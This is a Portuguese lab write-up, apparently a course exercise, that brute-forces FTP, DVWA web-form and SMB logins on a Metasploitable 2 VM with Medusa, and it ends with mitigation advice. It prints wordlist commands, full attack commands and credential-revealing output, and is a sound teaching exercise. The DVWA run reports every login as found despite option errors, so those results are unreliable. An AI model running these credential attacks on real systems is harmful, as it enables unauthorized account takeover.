# Desafio medusa


## Ferramentas
- Kali Linux
- Medusa
- Metasploitable 2
- VM Kali + VM Metasploitable 2

# Simulados:

## Força bruta em FTP: 


Acesso negado no FTP:


```                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali): 
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
 

Criando wordlists e uma lista de senhas:

- users.txt
- passwords.txt

Linhas de comando:

```
──(kali@kali)-[~]
└─$ echo -e "user \\nmsfadmin\nadmin\nroot" > users.txt

┌──(kali@kali)-[~]
└─$ echo -e "123456 \\npassword\nqewrty\nmsfadmin" > pass.txt

┌──(kali@kali)-[~]
└─$ cat pass.txt
123456
password
qewrty
msfadmin

┌──(kali@kali)-[~]
└─$ echo -e "user \nadmin\nmsfadmin\nroot" > users.txt

┌──(kali@kali)-[~]
└─$ cat users.txt
user
admin
msfadmin
root
``` 


Linha de comando:

``` medusa -h 192.168.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```

Resultado:

```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: password (1 of 4 complete)
2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: qewrty (2 of 4 complete)
2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: 123456  (4 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: password (1 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: 123456  (2 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
2026-11-10 11:48:01 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: qewrty (3 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: msfadmin (4 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: password (2 of 4 complete)
2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: 123456  (3 of 4 complete)
2026-11-10 11:48:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 4 complete) Password: qewrty (4 of 4 complete)
2026-11-10 11:48:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456  (1 of 4 complete)
2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: password (2 of 4 complete)
2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qewrty (4 of 4 complete)
```

Validação do acesso FTP com login e senha encontraodo com "SUCCESS"

                                                                                                                                                                         ```  
                                                                                                                                                                         
┌──(kali@kali)-[~]\
└─$ ftp 192.168.56.102\
Connected to 192.168.56.102.\
220 (vsFTPd 2.3.4)\
Name (192.168.56.102:kali): msfadmin\ 
331 Please specify the password.\
Password: \
230 Login successful.\
Remote system type is UNIX.\
Using binary mode to transfer files.\
ftp> 
```


## Automação de tentativas em formulário web (DVWA) 

Site do DVWA:
https://192.168.56.10/dvwa/login.php

Inspeção da página:

<img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/1d54dda2-5135-40f0-b507-e4cc1819725d" />


Linha de comando para teste acesso:

```
medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

Resultado:

```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: FORM.
WARNING: WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456  (1 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 123456  [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: password (2 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 3 complete) Password: msfadmin (1 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: msfadmin [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 4 complete) Password: 123456  (1 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456  [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 5 complete) Password: password (2 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 6 complete) Password: qewrty (3 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qewrty [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 7 complete) Password: 123456  (1 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: 123456  [SUCCESS]
2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 8 complete) Password: password (2 of 4 complete)
2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]
2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 9 complete) Password: qewrty (2 of 4 complete)
2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: qewrty [SUCCESS]
2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 10 complete) Password: 123456  (3 of 4 complete)
2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: 123456  [SUCCESS]
2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 11 complete) Password: password (4 of 4 complete)
2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: password [SUCCESS]
```

Resultado verificado ao utilizar o login e a senha encontrada:

<img width="1163" height="878" alt="Captura de tela de 2026-11-06 15-47-54" src="https://github.com/user-attachments/assets/b5b6cb70-6dc1-4e41-9bb2-f0292bdbc8d7" />




## Password spraying em SMB com enumeração de usuários


```
enum4linux -a 192.168.56.102 | tee enum_output.txt
```

<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/8347f748-8b88-497b-a22a-e3aa22b9f2e9" />



## Password spraying em SMB com enumeração de usuários.

Linhas de comando para gerar os senhas:

```
echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
```

O comando:

```
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
```

Execução comando:

```                                                                                                                                                                                                                
┌──(kali@kali)-[~]
└─$ medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2- T50
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: passowrd (1 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (2 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: Welome123 (3 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: passowrd (1 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: Welome123 (3 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: passowrd (1 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: Welome123 (2 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: 123456 (3 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: msfadmin (4 of 4 complete)
2026-11-11 08:24:31 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: passowrd (1 of 4 complete)
2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: 123456 (2 of 4 complete)
2026-11-11 08:24:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: Welome123 (3 of 4 complete)
2026-11-11 08:24:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 
```

Para validação do acesso encontrado, executamos:

```
(kali@kali)-[~]
└─$  smbclient -L //192.168.56.102 -U msfadmin
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
                                                                                                                                                                                                                                            
┌──(kali@kali)-[~]
└─$ 
```
## Conclusão

O uso de senhas fracas, conhecidas, deixam seus sistemas vulneráveis.


## Recomendações de mitigação

- Autenticação por multiplos fatores, pelo menos em 2 etapas(2MFA); \
- Senhas fortes, como simbolos, sem palavras de dicionário e com datas de expiração de senha; \
- Bloqueio de IPs, após identicafação de várias tentativas de login; \
- Segregação de rede; \
- Realizar auditorias regulares, usando ferramentas como medusa e outros métodos para fins de testes.




